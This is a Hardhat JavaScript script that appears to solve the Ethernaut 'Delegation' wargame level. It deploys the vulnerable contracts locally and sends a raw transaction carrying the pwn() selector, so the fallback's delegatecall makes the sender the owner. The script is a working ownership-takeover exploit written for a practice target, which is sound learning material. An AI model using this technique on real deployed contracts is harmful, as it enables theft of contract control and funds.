/*
The goal of this level is for you to claim ownership of the instance you are given.

  Things that might help

Look into Solidity's documentation on the delegatecall low level function, how it works, how it can be used to delegate operations to on-chain libraries, and what implications it has on execution scope.
Fallback methods
Method ids
*/

const hre = require("hardhat");
const path = require("path");
require('dotenv').config( {
  path: path.join(__dirname, '.env')
} );

PRIVATE_KEY=process.env.PRIVATE_KEY;
GAS_LIMIT=process.env.GAS_LIMIT;

async function main() {
  // Recreating the attack on ganache
  [macias, deployer] = await ethers.getSigners();

  const Delegate = await hre.ethers.getContractFactory("Delegate");
  this.delegate = await Delegate.connect(deployer).deploy(deployer.address);
  await this.delegate.deployed();

  const Delegation = await hre.ethers.getContractFactory("Delegation");
  this.delegation = await Delegation.connect(deployer).deploy(this.delegate.address);
  await this.delegation.deployed();

  // Getting the bytes4 signature of a function
  // Source -> https://ethereum.stackexchange.com/questions/83165/is-there-a-way-to-get-the-result-of-web3s-encodefunctioncall-with-ethers //
  let delegateABI = ["function pwn()"];
  let iface = new hre.ethers.utils.Interface(delegateABI); 
  const selectorHash = iface.encodeFunctionData("pwn")


  console.log("\n\n Performing attack ... \n\n");

  console.log(
    `
    pwn() selectorHash: ${selectorHash} \n
    current owner in delegation contract: ${await this.delegation.owner()}

    macias ETH balance: ${await hre.ethers.provider.getBalance(macias.address)}
    `
  );
  
  // Signing and Sending the tx
  const wallet = new hre.ethers.Wallet(PRIVATE_KEY);

  gasPrice = await hre.ethers.provider.getGasPrice()
  nonce = await hre.ethers.provider.getTransactionCount(wallet.address);

  let tx = {
    nonce: nonce,
    to: this.delegation.address,
    value: 0,
    gasLimit: parseInt(GAS_LIMIT),
    gasPrice: gasPrice,
    // msg.data contains the function signare of pwn(), bcs such a function doesn't exists on the Delegation contract, it will be handled by the fallback() and from there it will be executed a delegateCall() to the Delegate contract forwarding the msg.data
    // The Delegate contract will recognize the function signature encoded in the msg.data, and will call the pwn(), thus, setting the owner to be the msg.sender, which is the account that called the Delegation contract (bcs the delegateCall())!
    data: selectorHash 
  };

  let signedTx = await wallet.signTransaction(tx);
  //console.log(signedTx);
  let sentTx = await hre.ethers.provider.sendTransaction(signedTx);
  //console.log(sentTx);
  let txResult = await hre.ethers.provider.waitForTransaction(sentTx.hash);
  console.log("Transaction sent! - Getting the owner of the Delegate contract");
  //console.log("Transaction Result: ", txResult);

  console.log("===============================================\n===============================================\n");
  console.log("\n\n Results after performing the attack \n\n");

  console.log(
    `
    owner after the attack in delegation contract: ${await this.delegation.owner()}
    `
  );

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});